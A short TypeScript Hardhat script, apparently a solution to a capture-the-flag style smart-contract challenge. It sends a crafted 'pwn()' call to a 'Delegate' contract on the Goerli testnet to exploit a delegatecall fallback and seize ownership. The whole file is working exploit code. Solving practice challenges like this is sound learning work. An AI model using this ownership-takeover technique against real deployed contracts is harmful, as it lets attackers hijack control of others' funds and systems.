import { TransactionResponse } from "@ethersproject/providers"
import { ethers } from "hardhat";
import * as dotenv from "dotenv";

dotenv.config();

const provider = new ethers.providers.JsonRpcProvider(process.env.GOERLI_URL)
const privateKey: string = process.env.PRIVATE_KEY || ""
const attacker = new ethers.Wallet(privateKey, provider)

const CONTRACT_NAME = "Delegate"
const CONTRACT_ADDRESS = "0xC7eD2FCc15786F9A9C195772737B98aa6eAb5cCc"

async function main() {
    let tx: TransactionResponse

    const factory = await ethers.getContractFactory(CONTRACT_NAME)
    const contract = factory.attach(CONTRACT_ADDRESS)

    const delegateeAbi = ["function pwn()"]
    const iface = new ethers.utils.Interface(delegateeAbi)
    const data = iface.encodeFunctionData("pwn")

    tx = await attacker.sendTransaction({
        to: contract.address,
        data: data,
        gasLimit: 100000
    })
    await tx.wait()

    console.log("Delagate: claimed ownership of the contract");
    console.log(await contract.owner())
}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
  });